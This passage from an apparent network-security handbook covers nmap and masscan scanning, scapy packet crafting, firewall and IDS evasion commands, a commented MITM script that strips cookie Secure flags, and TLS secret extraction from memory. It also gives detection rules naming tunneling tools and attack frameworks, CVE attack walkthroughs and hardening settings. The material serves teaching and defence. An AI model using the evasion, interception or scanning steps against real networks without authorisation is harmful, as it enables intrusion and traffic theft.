# from mitmproxy import http
# def response(flow: http.HTTPFlow):
#     if "Set-Cookie" in flow.response.headers:
#         flow.response.headers["Set-Cookie"] = flow.response.headers["Set-Cookie"].replace("Secure;", "")

mitmproxy --mode transparent -s modify.py
```

---

## 5. Network scanning

### 5.1 Nmap TCP scan types

```bash
# SYN scan (half-open, default for root) — sends SYN, reads SYN-ACK/RST
nmap -sS -p 1-65535 192.168.1.100
# Flags sent: SYN → receives SYN-ACK (open) or RST (closed) or nothing (filtered)
# Never completes handshake — stealthy, no application-layer logging

# TCP connect scan (full handshake, no root required)
nmap -sT -p 1-65535 192.168.1.100
# Uses OS connect() syscall — completes full 3-way handshake
# Logged by application — less stealthy

# ACK scan (firewall mapping — not port scanning)
nmap -sA -p 1-65535 192.168.1.100
# Sends ACK only → RST (unfiltered) or nothing (filtered)
# Determines firewall rules, not open/closed ports

# Window scan (like ACK but examines RST window size)
nmap -sW -p 1-65535 192.168.1.100
# RST with non-zero window = open; RST with zero window = closed
# OS-dependent — unreliable on many modern stacks

# Maimon scan (FIN/ACK)
nmap -sM -p 1-65535 192.168.1.100
# Sends FIN/ACK → some BSD-derived stacks drop FIN/ACK for open ports
# RST = closed; no response = open|filtered (per RFC 793 ambiguity)

# NULL, FIN, Xmas scans
nmap -sN -p 80 192.168.1.100  # No flags set
nmap -sF -p 80 192.168.1.100  # FIN only
nmap -sX -p 80 192.168.1.100  # FIN+PSH+URG

# Service version detection
nmap -sV --version-intensity 5 -p 22,80,443 192.168.1.100

# NSE vulnerability scripts
nmap --script vuln -p 80,443 192.168.1.100
nmap --script ssl-heartbleed -p 443 192.168.1.100
nmap --script dns-cache-snoop --script-args dns-cache-snoop.domains={"facebook.com","google.com"} 192.168.1.53
```

### 5.2 masscan and Zmap

```bash
# masscan — internet-scale SYN scanning
masscan -p 80,443,8080 192.168.0.0/16 --rate=10000
# Stateless: sends SYNs and matches responses via cookie in seq number
# Can scan the entire IPv4 space in ~6 minutes at 10M pps

# Zmap — single-port internet-wide scanning
zmap -p 443 -o results.csv --bandwidth=100M
# Optimized for single-port scanning of the entire IPv4 space
# Probe modules: tcp_synscan, icmp_echoscan, udp
```

### 5.3 Detection of scanning

Suricata rules:
```
alert tcp any any -> $HOME_NET any (msg:"Nmap SYN scan detected"; \
  flags:S,12; threshold:type both, track by_src, count 100, seconds 10; \
  classtype:attempted-recon; sid:1000050; rev:1;)

alert tcp any any -> $HOME_NET any (msg:"Nmap XMAS scan detected"; \
  flags:FPU,12; classtype:attempted-recon; sid:1000051; rev:1;)

alert tcp any any -> $HOME_NET any (msg:"Nmap NULL scan detected"; \
  flags:0,12; classtype:attempted-recon; sid:1000052; rev:1;)
```

Wireshark filters:
```
# SYN scan pattern (SYN without subsequent ACK)
tcp.flags.syn == 1 && tcp.flags.ack == 0 && tcp.window_size <= 1024

# Xmas scan
tcp.flags.fin == 1 && tcp.flags.push == 1 && tcp.flags.urg == 1

# NULL scan
tcp.flags == 0
```

---

## 6. Packet crafting and firewall evasion

### 6.1 Scapy fundamentals

```python
#!/usr/bin/env python3
from scapy.all import *

# Craft a TCP SYN with custom options
pkt = IP(dst="192.168.1.100", ttl=64) / \
      TCP(dport=80, flags="S", seq=1000,
          options=[("MSS", 1460), ("WScale", 7), ("Timestamp", (12345, 0)),
                   ("SAckOK", b"")])
resp = sr1(pkt, timeout=5)
if resp and resp.haslayer(TCP):
    if resp[TCP].flags == 0x12:  # SYN-ACK
        print(f"Port open, server ISN={resp[TCP].seq}")
    elif resp[TCP].flags == 0x14:  # RST-ACK
        print("Port closed")
```

### 6.2 Firewall evasion techniques

#### IP fragmentation evasion

```bash
# Nmap fragmentation
nmap -f -sS 192.168.1.100         # 8-byte fragments
nmap --mtu 24 -sS 192.168.1.100   # 24-byte fragments
nmap -D RND:10 -sS 192.168.1.100  # decoy scan (10 random decoy IPs)
```

#### TTL manipulation

```bash
# Send packets with TTL just enough to reach the target but not the firewall/IDS behind it
nmap --ttl 15 -sS 192.168.1.100

# hping3: TTL manipulation
hping3 -S -p 80 --ttl 10 192.168.1.100
```

#### Protocol confusion

```bash
# Source port manipulation (pretend to be DNS reply or established connection)
nmap -sS --source-port 53 192.168.1.100
# Some firewalls allow traffic from port 53 (DNS) or 80 (HTTP) assuming it's return traffic

hping3 -S -p 80 --baseport 53 192.168.1.100
```

#### Firewall fingerprinting

```bash
# Determine firewall type by response patterns
nmap -sA -p 80 192.168.1.100  # ACK scan: unfiltered vs filtered

# Firewalk — determine firewall rules by sending packets with TTL
# that expires one hop past the firewall
firewalk -S 1-1024 -i eth0 -p TCP 192.168.1.1 192.168.1.100
# Gateway IP       Target IP
# Reports which ports the firewall allows through
```

#### Timing evasion

```bash
# Nmap timing templates
nmap -T0 -sS 192.168.1.100  # Paranoid: 5 min between probes (IDS evasion)
nmap -T1 -sS 192.168.1.100  # Sneaky: 15 sec between probes
nmap -T2 -sS 192.168.1.100  # Polite: 0.4 sec between probes
```

---

## 7. Network protocol forensics

### 7.1 TCP stream reconstruction from packet captures

#### Reassembling TCP sessions with tshark

```bash
# List all TCP conversations in a pcap (sorted by bytes transferred)
tshark -r capture.pcap -q -z conv,tcp

# Follow a specific TCP stream (stream index 5) and dump as ASCII
tshark -r capture.pcap -q -z follow,tcp,ascii,5

# Extract all HTTP objects from a capture
tshark -r capture.pcap --export-objects http,/tmp/http_objects/

# Reassemble a specific TCP stream to raw binary
tshark -r capture.pcap -q -z follow,tcp,raw,5 | xxd -r -p > stream5.bin

# Filter by TCP conversation tuple and export payload
tshark -r capture.pcap -Y "ip.addr==10.0.0.5 && tcp.port==443" \
  -T fields -e tcp.payload > session_payload.hex
```

#### Handling retransmissions and out-of-order segments

```bash
# Show retransmissions (TCP analysis flags)
tshark -r capture.pcap -Y "tcp.analysis.retransmission" \
  -T fields -e frame.number -e ip.src -e ip.dst -e tcp.stream

# Show out-of-order segments
tshark -r capture.pcap -Y "tcp.analysis.out_of_order" \
  -T fields -e frame.number -e tcp.seq -e tcp.stream

# Show TCP window size changes (potential exfiltration or throttling)
tshark -r capture.pcap -Y "tcp.window_size_value < 1000 && tcp.flags.syn == 0" \
  -T fields -e frame.time -e ip.src -e tcp.window_size_value
```

### 7.2 DNS query log forensic analysis

#### Passive DNS reconstruction

```bash
# Extract all DNS queries and responses from pcap
tshark -r capture.pcap -Y "dns" \
  -T fields -e frame.time -e ip.src -e ip.dst -e dns.qry.name \
  -e dns.qry.type -e dns.a -e dns.aaaa -e dns.resp.ttl \
  -E separator=, -E header=y > dns_forensic_log.csv

# Identify unique queried domains, sorted by frequency
tshark -r capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name | sort | uniq -c | sort -rn | head -50

# Detect domains queried only once (potential DGA or C2 beaconing)
tshark -r capture.pcap -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name | sort | uniq -c | sort -n | awk '$1 == 1'

# Passive DNS timeline — map domain resolution to IP over time
tshark -r capture.pcap -Y "dns.flags.response == 1 && dns.a" \
  -T fields -e frame.time -e dns.qry.name -e dns.a -e dns.resp.ttl \
  -E separator='|' | sort -t'|' -k2,2 -k1,1
```

### 7.3 TLS session key extraction for encrypted traffic analysis

#### SSLKEYLOGFILE method (Pre-Master Secret logging)

```bash
# Set environment variable BEFORE launching the browser or client
export SSLKEYLOGFILE=/tmp/tls_keys.log

# Capture traffic while the TLS client is active
tcpdump -i eth0 -w /tmp/encrypted_session.pcap port 443

# Decrypt in Wireshark: Edit > Preferences > Protocols > TLS >
#   (Pre)-Master-Secret log filename: /tmp/tls_keys.log

# Decrypt with tshark using the keylog file
tshark -r /tmp/encrypted_session.pcap \
  -o tls.keylog_file:/tmp/tls_keys.log \
  -Y "http" -T fields -e http.host -e http.request.uri
```

The SSLKEYLOGFILE format (NSS Key Log Format) records lines of the form:
```
CLIENT_RANDOM <client_random_hex> <master_secret_hex>
```
This works for TLS 1.2. For TLS 1.3, the format uses labels `CLIENT_HANDSHAKE_TRAFFIC_SECRET`, `SERVER_HANDSHAKE_TRAFFIC_SECRET`, `CLIENT_TRAFFIC_SECRET_0`, and `SERVER_TRAFFIC_SECRET_0`.

#### Memory-based PMS extraction

```bash
# Extract PMS from process memory (requires root or ptrace access)
# For OpenSSL-linked processes, the master secret is in SSL_SESSION struct
gdb -batch -p <PID> \
  -ex "set pagination off" \
  -ex "find /b 0x00, 0xffffffffffffffff, 0x03, 0x03" \
  -ex "quit"

# Volatility 3 — scan for TLS session structures in memory dump
vol3 -f memory.dmp windows.netscan.NetScan
vol3 -f memory.dmp linux.sockstat.Sockstat
```

### 7.4 Network timeline reconstruction

```bash
# Merge multiple pcaps into a single timeline (editcap + mergecap)
mergecap -w merged.pcap sensor1.pcap sensor2.pcap sensor3.pcap

# Verify merge — show first and last timestamps
capinfos -ae merged.pcap

# Correlate network events with system logs (UTC timestamps)
tshark -r merged.pcap -T fields -e frame.time_epoch -e ip.src -e ip.dst \
  -e tcp.dstport -e dns.qry.name -e tls.handshake.extensions_server_name \
  -E separator=',' > network_timeline.csv

# Build kill-chain timeline from pcap:
# 1. Initial DNS resolution
tshark -r merged.pcap -Y "dns.qry.name contains 'malicious.example'" \
  -T fields -e frame.time -e ip.src -e dns.qry.name -e dns.a

# 2. TLS handshake to resolved IP
tshark -r merged.pcap -Y "tls.handshake.type == 1 && ip.dst == 203.0.113.50" \
  -T fields -e frame.time -e ip.src -e tls.handshake.extensions_server_name

# 3. Data transfer volume
tshark -r merged.pcap -Y "ip.dst == 203.0.113.50" -q -z conv,tcp
```

### 7.5 Evidence preservation

```bash
# Generate SHA-256 hash of original capture immediately after acquisition
sha256sum original_capture.pcap > capture_hash.sha256
date -u +"%Y-%m-%dT%H:%M:%SZ" >> capture_hash.sha256

# Create a read-only copy
cp original_capture.pcap evidence_copy.pcap
chmod 444 evidence_copy.pcap

# Verify integrity before analysis
sha256sum -c capture_hash.sha256

# Capture metadata for chain of custody
capinfos -A evidence_copy.pcap > evidence_metadata.txt
echo "Analyst: $(whoami)  Host: $(hostname)  Time: $(date -u --iso-8601=seconds)" \
  >> evidence_metadata.txt
```

### 7.6 Memory forensics for network artifacts

```bash
# Volatility 3 — extract network connections from memory image
vol3 -f memory.dmp windows.netscan.NetScan
# Fields: offset, protocol, local addr, remote addr, state, PID, owner, create time

# Linux memory image — socket and connection state
vol3 -f memory.dmp linux.sockstat.Sockstat

# Extract DNS cache from Windows memory
vol3 -f memory.dmp windows.registry.printkey \
  --key "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters"

# Correlate: match PID from netscan to process list
vol3 -f memory.dmp windows.pslist.PsList | grep <PID>
vol3 -f memory.dmp windows.cmdline.CmdLine --pid <PID>
```

---

## 8. Network protocol detection engineering

### 8.1 Sigma rules for network anomalies

#### DNS tunneling detection

```yaml
title: DNS Tunneling — High Entropy Subdomain Queries
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: >
  Detects DNS queries with unusually long subdomains or high-entropy labels,
  indicative of DNS tunneling tools (iodine, dnscat2, dns2tcp).
logsource:
  category: dns
  product: any
detection:
  selection:
    dns.query|re: '^[a-z0-9]{30,}\.'
  filter:
    dns.query|endswith:
      - '.cdn.cloudflare.com'
      - '.amazonaws.com'
  condition: selection and not filter
level: high
tags:
  - attack.command_and_control
  - attack.t1071.004
  - attack.exfiltration
  - attack.t1048.003
```

#### TLS certificate anomaly detection

```yaml
title: TLS Connection with Self-Signed or Expired Certificate
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: >
  Detects outbound TLS connections where the server presents a self-signed
  certificate or a certificate with validity issues. Common in C2 infrastructure.
logsource:
  category: proxy
  product: any
detection:
  selection_selfsigned:
    tls.server.issuer: tls.server.subject
  selection_expired:
    tls.server.not_after|lt: '%current_timestamp%'
  condition: selection_selfsigned or selection_expired
level: medium
tags:
  - attack.command_and_control
  - attack.t1573.002
```

#### TCP port scan detection

```yaml
title: Horizontal Port Scan Detected
id: c3d4e5f6-a7b8-9012-cdef-123456789012
status: experimental
description: >
  Detects a single source IP connecting to more than 50 distinct destination
  ports within a short window, indicative of reconnaissance scanning.
logsource:
  category: firewall
  product: any
detection:
  selection:
    action: allowed
  condition: selection | count(dst_port) by src_ip > 50
  timeframe: 5m
level: high
tags:
  - attack.discovery
  - attack.t1046
```

### 8.2 Suricata rules for protocol abuse detection

```yaml
# DNS tunneling: TXT record responses with large payload
alert dns $HOME_NET any -> any any (msg:"ET DNS Tunneling - Large TXT Response"; \
  dns.query; content:"|00 10|"; byte_test:2,>,512,0,relative; \
  threshold: type both, track by_src, count 10, seconds 60; \
  classtype:bad-unknown; sid:2100001; rev:1;)

# DNS exfiltration: excessive NXDOMAIN responses from single source
alert dns any any -> $HOME_NET any (msg:"ET DNS Excessive NXDOMAIN - Possible DGA"; \
  dns.opcode:0; dns.rcode:3; \
  threshold: type threshold, track by_src, count 50, seconds 60; \
  classtype:bad-unknown; sid:2100002; rev:1;)

# TLS: JA3 hash matching known Cobalt Strike default
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET MALWARE Cobalt Strike Default JA3"; \
  ja3.hash; content:"72a589da586844d7f0818ce684948eea"; \
  classtype:trojan-activity; sid:2100003; rev:1;)

# TCP: SYN scan detection — SYN without completing handshake
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"ET SCAN TCP SYN Scan Detected"; \
  flags:S,12; threshold: type both, track by_src, count 100, seconds 10; \
  classtype:attempted-recon; sid:2100004; rev:1;)

# TLS: Certificate with very short validity (< 7 days, common in phishing)
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"ET TLS Short-Lived Certificate"; \
  tls.cert_validity; content:"days"; pcre:"/^[0-6] days/"; \
  classtype:bad-unknown; sid:2100005; rev:1;)
```

### 8.3 Zeek scripts for behavioral network analysis

```zeek
# detect_dns_tunneling.zeek — flag hosts with high DNS query volume or long queries
@load base/protocols/dns

module DNSTunnelingDetect;

export {
    redef enum Notice::Type += { DNS_Tunneling_Suspect };
    const query_length_threshold = 60 &redef;
    const query_count_threshold = 200 &redef;
    const monitoring_interval = 5min &redef;
}

global dns_query_counts: table[addr] of count &default=0
    &create_expire=monitoring_interval;

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
    {
    if ( |query| > query_length_threshold )
        {
        NOTICE([$note=DNS_Tunneling_Suspect,
                $msg=fmt("Long DNS query from %s: %s (%d chars)",
                         c$id$orig_h, query, |query|),
                $conn=c,
                $identifier=cat(c$id$orig_h, query)]);
        }

    ++dns_query_counts[c$id$orig_h];
    if ( dns_query_counts[c$id$orig_h] == query_count_threshold )
        {
        NOTICE([$note=DNS_Tunneling_Suspect,
                $msg=fmt("High DNS query volume from %s: %d queries in %s",
                         c$id$orig_h, query_count_threshold, monitoring_interval),
                $conn=c,
                $identifier=cat(c$id$orig_h, "volume")]);
        }
    }
```

### 8.4 JA3/JA4+ fingerprint-based detection

```bash
# Extract JA3 hashes from a pcap using tshark (Wireshark 3.x+)
tshark -r capture.pcap -Y "tls.handshake.type == 1" \
  -T fields -e ip.src -e ip.dst -e tls.handshake.ja3 \
  -e tls.handshake.ja3_full

# Extract JA3S (server) fingerprints
tshark -r capture.pcap -Y "tls.handshake.type == 2" \
  -T fields -e ip.src -e ip.dst -e tls.handshake.ja3s

# Compare extracted JA3 hashes against a threat intelligence list
# Known malicious JA3 hashes (examples):
# 72a589da586844d7f0818ce684948eea  — Cobalt Strike (default malleable profile)
# e7d705a3286e19ea42f587b344ee6865  — Metasploit Meterpreter (default)
# 6734f37431670b3ab4292b8f60f29984  — Trickbot
```

JA4+ extends JA3 with additional signals (TLS extensions ordering, ALPN, signature algorithms) and produces a human-readable fingerprint format: `t13d1516h2_8daaf6152771_b0da82dd1658`. The `t` prefix indicates TLS, `13` the version, `d` the SNI presence, and the hash segments cover cipher suites, extensions, and signature algorithms respectively.

### 8.5 DNS over HTTPS (DoH) detection challenges

```bash
# DoH uses standard HTTPS on port 443 — encrypted, blends with normal traffic.
# Detection strategies:

# 1. Known DoH resolver IP blocking (network-level)
# Cloudflare DoH: 1.1.1.1, 1.0.0.1, 2606:4700:4700::1111
# Google DoH: 8.8.8.8, 8.8.4.4, 2001:4860:4860::8888
# Quad9 DoH: 9.9.9.9, 149.112.112.112

# 2. SNI-based detection (works until ECH is deployed)
tshark -r capture.pcap -Y "tls.handshake.extensions_server_name contains 'dns'" \
  -T fields -e ip.src -e tls.handshake.extensions_server_name

# 3. JA3 fingerprinting of DoH client libraries
# DoH clients (e.g., Firefox built-in) have distinctive JA3 fingerprints
# that differ from standard browser TLS handshakes

# 4. Traffic analysis: DoH produces small, frequent HTTPS POST/GET requests
# to a single endpoint — detectable via flow metadata even when encrypted
```

### 8.6 Network-level IOC matching automation

```bash
# Bulk IOC matching against Zeek conn.log using zeek-cut and grep
cat conn.log | zeek-cut id.resp_h id.resp_p proto service \
  | grep -Ff malicious_ips.txt > ioc_matches.log

# Suricata fast pattern matching with IP reputation list
# In /etc/suricata/suricata.yaml:
#   reputation-categories-file: /etc/suricata/iprep/categories.txt
#   reputation-file: /etc/suricata/iprep/reputation.list

# Automated STIX/TAXII feed ingestion to Suricata rules
# Using suricata-update with custom rule sources:
suricata-update add-source et/open \
  https://rules.emergingthreats.net/open/suricata-7.0/emerging.rules.tar.gz
suricata-update
suricatasc -c reload-rules
```

---

## 9. Advanced network attack techniques

### 9.1 TCP side-channel attacks

#### Off-path TCP injection via challenge ACK rate limiting

**CVE-2016-5696** (CVSS 4.8, Linux kernel < 4.7). RFC 5961 introduced challenge ACKs to prevent blind in-window RST/SYN/data injection attacks. The Linux implementation used a global rate counter (`tcp_challenge_ack_limit`, default 100/sec) shared across all connections. An off-path attacker could:

1. Send spoofed RST packets to the target connection to trigger challenge ACKs
2. Simultaneously probe the global challenge ACK counter by sending RSTs to a connection the attacker controls to the same host
3. When the counter is exhausted (no challenge ACK returned for attacker's probe), it confirms the spoofed RST hit an active connection
4. Use binary search on sequence numbers to narrow the valid window
5. Inject data or reset the connection

```bash
# Check current challenge ACK limit (vulnerable if low and globally shared)
sysctl net.ipv4.tcp_challenge_ack_limit
# Mitigation: randomize the limit
sysctl -w net.ipv4.tcp_challenge_ack_limit=1000
# Kernel 4.7+ adds per-connection randomized limits
```

#### Sequence number inference via IPID side channel

**SAD DNS (CVE-2020-25705)** extended off-path attacks to DNS. The attack exploited the ICMP global rate limit in Linux to infer whether a spoofed UDP packet to a DNS resolver's ephemeral port was accepted or rejected (ICMP port unreachable). By observing ICMP rate limit exhaustion, the attacker could determine the correct source port of an outstanding DNS query, then inject a forged response.

```bash
# Check ICMP rate limit (vulnerable default)
sysctl net.ipv4.icmp_ratelimit   # default: 1000ms
sysctl net.ipv4.icmp_msgs_burst  # default: 50

# Mitigation: randomize ICMP rate limiting (kernel 5.10+)
# Or use DNS cookies (RFC 7873) and DNSSEC
```

### 9.2 DNS rebinding attacks

DNS rebinding allows an attacker-controlled domain to resolve first to the attacker's server (serving malicious JavaScript), then to a private IP (e.g., 192.168.1.1). The browser's same-origin policy is bound to the hostname, not the IP — so the script can now access internal services.

**Attack flow:**
```
1. Victim visits attacker.example (resolves to 203.0.113.10, attacker server)
2. JavaScript loaded, starts polling attacker.example
3. Attacker's DNS server now returns 192.168.1.1 (short TTL already expired)
4. Browser connects to 192.168.1.1 under origin attacker.example
5. JavaScript reads responses from internal service, exfiltrates to attacker
```

**Defenses:**
```bash
# dnsmasq: block private IP resolution for external domains
# In /etc/dnsmasq.conf:
stop-dns-rebind
rebind-localhost-ok

# Unbound: private-address directives
# In /etc/unbound/unbound.conf:
#   server:
#     private-address: 10.0.0.0/8
#     private-address: 172.16.0.0/12
#     private-address: 192.168.0.0/16
#     private-address: 169.254.0.0/16

# Application-level: validate Host header, require authentication for internal APIs
```

### 9.3 TLS 1.3 0-RTT replay attacks

TLS 1.3 (RFC 8446 section 8) 0-RTT data uses a PSK (pre-shared key) from a previous session to send application data in the first flight, eliminating one round-trip. However, 0-RTT data has no forward secrecy against PSK compromise and is **replayable** — a network-level attacker can capture and replay the ClientHello + 0-RTT data to the server.

**Impact:** If the server processes the 0-RTT data idempotently (e.g., a GET request), replay is harmless. For state-changing operations (POST, PUT, DELETE), replay can cause duplicate actions (double payments, duplicate orders).

**Defenses (RFC 8446 section 8.1-8.3):**
- Servers SHOULD implement single-use session tickets (anti-replay at the cost of server state)
- Servers SHOULD limit the time window for 0-RTT acceptance (typically < 10 seconds)
- Applications MUST NOT send non-idempotent requests in 0-RTT data
- Use `Early-Data` HTTP header (RFC 8470) to signal 0-RTT data to proxies and backends

```bash
# Nginx: disable 0-RTT to eliminate replay risk entirely
# ssl_early_data off;   # default in nginx

# Nginx: enable with proxy awareness
# ssl_early_data on;
# proxy_set_header Early-Data $ssl_early_data;
# Backend rejects non-idempotent requests when Early-Data: 1
```

### 9.4 QUIC protocol security analysis

QUIC (RFC 9000-9002) integrates transport and encryption (TLS 1.3) into a single UDP-based protocol. The attack surface differs from TCP+TLS:

- **Amplification attacks:** QUIC mandates that initial server responses must not exceed 3x the client's initial packet size (minimum 1200 bytes). The server sends a Retry token to validate the client address before allocating state.
- **Connection migration:** QUIC allows seamless migration across network paths (e.g., WiFi to cellular). An attacker on the new path could attempt to hijack the connection; QUIC defends with path validation (PATH_CHALLENGE/PATH_RESPONSE frames).
- **HTTP/3 rapid reset (CVE-2023-44487, CVSS 7.5):** Although initially discovered in HTTP/2, the same stream-reset abuse concept applies. Attackers open and immediately reset streams at high speed, consuming server resources without triggering typical connection-level rate limits. Mitigation: per-connection stream creation rate limiting.

```bash
# Test QUIC connectivity and version negotiation
curl --http3 -I https://example.com

# Capture QUIC traffic (UDP 443)
tshark -i eth0 -f "udp port 443" -Y "quic" \
  -T fields -e quic.version -e quic.dcid -e quic.scid
```

### 9.5 BGP hijacking for traffic interception

BGP hijacking is a protocol-design-level vulnerability — there is no single CVE. Any AS can announce any prefix; without RPKI validation, neighboring ASes accept the announcement.

**Real incidents:**
- **2008-02-24:** Pakistan Telecom (AS17557) announced 208.65.153.0/24 (YouTube) to block domestic access; the route leaked globally via PCCW, taking YouTube offline worldwide for ~2 hours.
- **2020-04-01:** Rostelecom (AS12389) announced prefixes belonging to Akamai, Cloudflare, and AWS for ~1 hour, redirecting traffic through Russian infrastructure.

**Detection:**
```bash
# Monitor BGP announcements via RIPE RIS or RouteViews
# RIPE RIS Live streaming API:
curl -s "https://ris-live.ripe.net/v1/stream/?format=json&type=UPDATE" \
  | head -20

# BGPStream (CAIDA) for historical analysis
bgpstream -p routeviews -w 1708300800,1708387200 \
  -k "208.65.153.0/24" -e prefix-hijack
```

**Defenses:**
- **RPKI + ROV (Route Origin Validation):** Sign ROAs (Route Origin Authorizations) binding your prefixes to your ASN. Configure routers to reject RPKI-invalid routes.
- **BGP communities for path signaling:** Use well-known communities to mark routes as "do not export" or "blackhole."

### 9.6 GnuTLS session resumption vulnerability

**CVE-2020-13777** (CVSS 7.4, GnuTLS < 3.6.14). GnuTLS failed to properly initialize the session ticket encryption key, using an uninitialized buffer instead. This meant TLS session tickets were encrypted with predictable (or zero) key material. An attacker who captured encrypted session tickets could decrypt them, recovering the session's master secret and all session data. This affected TLS 1.2 session tickets and TLS 1.3 PSK-based resumption.

---

## 10. Network protocol hardening reference

### 10.1 DNS hardening

#### DNSSEC deployment

```bash
# Generate KSK and ZSK for a zone (BIND 9)
dnssec-keygen -a ECDSAP256SHA256 -f KSK example.com   # Key Signing Key
dnssec-keygen -a ECDSAP256SHA256 example.com           # Zone Signing Key

# Sign the zone
dnssec-signzone -A -3 $(head -c 1000 /dev/urandom | sha1sum | cut -b 1-16) \
  -N INCREMENT -o example.com -t db.example.com

# Verify DNSSEC chain from root
dig +dnssec +sigchase +trusted-key=./root.keys example.com A
delv @8.8.8.8 example.com A +rtrace   # DNSSEC validation trace
```

#### DoH/DoT configuration (Unbound)

```yaml
# /etc/unbound/unbound.conf
server:
    interface: 127.0.0.1@853          # DoT listener
    interface: 127.0.0.1@443          # DoH listener
    tls-service-pem: "/etc/unbound/cert.pem"
    tls-service-key: "/etc/unbound/key.pem"
    tls-port: 853
    https-port: 443
    access-control: 10.0.0.0/8 allow
    # Response Rate Limiting — mitigate amplification
    ratelimit: 1000                    # max responses/sec per /24
    ip-ratelimit: 100                  # max queries/sec per client IP
    # Hardening
    hide-identity: yes
    hide-version: yes
    harden-glue: yes
    harden-dnssec-stripped: yes
    harden-referral-path: yes
    use-caps-for-id: yes               # 0x20 encoding for query name randomization
```

### 10.2 TLS hardening

#### Cipher suite selection (modern profile)

```nginx
# Nginx TLS configuration (Mozilla Modern, 2024)
ssl_protocols TLSv1.3;
ssl_ciphers '';  # TLS 1.3 ciphers are not configurable via ssl_ciphers
ssl_conf_command Ciphersuites TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256;
ssl_prefer_server_ciphers off;   # not needed for TLS 1.3
ssl_session_timeout 1d;
ssl_session_cache shared:SSL:10m;
ssl_session_tickets off;          # disable for forward secrecy
ssl_stapling on;
ssl_stapling_verify on;
resolver 127.0.0.1 valid=300s;
```

#### Certificate Transparency monitoring

```bash
# Query CT logs for certificates issued for your domain
# Using crt.sh (Sectigo CT log aggregator)
curl -s "https://crt.sh/?q=%.example.com&output=json" \
  | jq '.[0:10] | .[] | {id, issuer_name, not_before, not_after, common_name}'

# Certspotter (SSLMate) — monitor for new certificates
# API endpoint: https://api.certspotter.com/v1/issuances
curl -s "https://api.certspotter.com/v1/issuances?domain=example.com&expand=dns_names" \
  | jq '.[] | {id, dns_names, issuer, not_before}'
```

#### HSTS preload

```
# HTTP response header
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

# Requirements for HSTS preload list submission:
# 1. Valid TLS certificate
# 2. Redirect HTTP to HTTPS on the same host
# 3. All subdomains served over HTTPS
# 4. HSTS header on base domain with includeSubDomains and preload
# 5. max-age >= 31536000 (1 year)
# Submit at: https://hstspreload.org/
```

### 10.3 TCP stack hardening

```bash
# SYN cookies — defense against SYN flooding (enabled by default in most distros)
sysctl -w net.ipv4.tcp_syncookies=1

# RFC 5961 challenge ACK limit — randomize to prevent CVE-2016-5696
sysctl -w net.ipv4.tcp_challenge_ack_limit=2147483647

# Disable TCP timestamps if not needed (prevents uptime fingerprinting)
sysctl -w net.ipv4.tcp_timestamps=0
# Trade-off: disabling breaks PAWS (Protection Against Wrapped Sequences)
# and RTT estimation — keep enabled on high-throughput servers

# TCP window scaling — keep enabled, but monitor for abuse
sysctl -w net.ipv4.tcp_window_scaling=1

# Limit orphan sockets (half-closed connections consuming memory)
sysctl -w net.ipv4.tcp_max_orphans=65536

# Reduce TIME_WAIT duration (reuse for new connections)
sysctl -w net.ipv4.tcp_tw_reuse=1

# Reduce FIN_WAIT2 timeout
sysctl -w net.ipv4.tcp_fin_timeout=30

# Ignore ICMP redirects (prevent route manipulation)
sysctl -w net.ipv4.conf.all.accept_redirects=0
sysctl -w net.ipv6.conf.all.accept_redirects=0

# Disable source routing
sysctl -w net.ipv4.conf.all.accept_source_route=0
sysctl -w net.ipv6.conf.all.accept_source_route=0

# Enable reverse path filtering (anti-spoofing)
sysctl -w net.ipv4.conf.all.rp_filter=1
```

### 10.4 Network segmentation and microsegmentation

**Segmentation tiers:**

| Tier | Implementation | Use case |
|------|---------------|----------|
| VLAN | 802.1Q tagging, switch-level | Zone separation (DMZ, internal, management) |
| Firewall zones | Stateful L3/L4 rules | Inter-zone traffic control |
| Microsegmentation | Host-based firewall (iptables/nftables, Windows Firewall) or SDN | Workload-to-workload within a zone |
| Zero-trust overlay | Mutual TLS, SPIFFE/SPIRE identities | Service-to-service authentication regardless of network position |

```bash
# nftables microsegmentation example — allow only specific service-to-service flows
nft add table inet microseg
nft add chain inet microseg forward '{ type filter hook forward priority 0; policy drop; }'

# Allow web tier (10.0.1.0/24) → app tier (10.0.2.0/24) on port 8080
nft add rule inet microseg forward \
  ip saddr 10.0.1.0/24 ip daddr 10.0.2.0/24 tcp dport 8080 accept

# Allow app tier → database tier (10.0.3.0/24) on port 5432
nft add rule inet microseg forward \
  ip saddr 10.0.2.0/24 ip daddr 10.0.3.0/24 tcp dport 5432 accept

# Log and drop everything else
nft add rule inet microseg forward log prefix "MICROSEG_DROP: " drop
```

### 10.5 Firewall rule optimization and audit methodology

```bash
# Step 1: Export current ruleset
iptables-save > /tmp/iptables_audit_$(date -u +%Y%m%d).rules
# or for nftables:
nft list ruleset > /tmp/nft_audit_$(date -u +%Y%m%d).rules

# Step 2: Identify unused rules (rules with zero packet counters)
iptables -L -v -n --line-numbers | awk '$1 ~ /^[0-9]/ && $2 == "0" { print "Unused rule:", $0 }'

# Step 3: Check for shadowed rules (broad rule before specific rule)
# A rule is shadowed when a preceding rule matches a superset of its traffic
# Manual review required — look for:
#   - ACCEPT 0.0.0.0/0 before specific subnet rules
#   - Port ranges that encompass later specific port rules

# Step 4: Verify default-deny baseline
iptables -L INPUT -n | tail -1   # should show DROP or REJECT
iptables -L FORWARD -n | tail -1
iptables -L OUTPUT -n | tail -1

# Step 5: Test firewall rules against expected policy
nmap -sS -p 1-65535 <target> --reason  # verify only intended ports are open
```

---

## 11. Cross-references

**To Domain 2:** TCP SYN cookies use kernel-level implementation in `net/ipv4/` — the same kernel networking stack gated by seccomp (Chapter 2B section 3) and namespaced by network namespaces (Chapter 2C section 3.3). IPsec and QUIC interact with the kernel's packet processing path in `netfilter` (Chapter 2C section 4, Chapter 5B section 5).

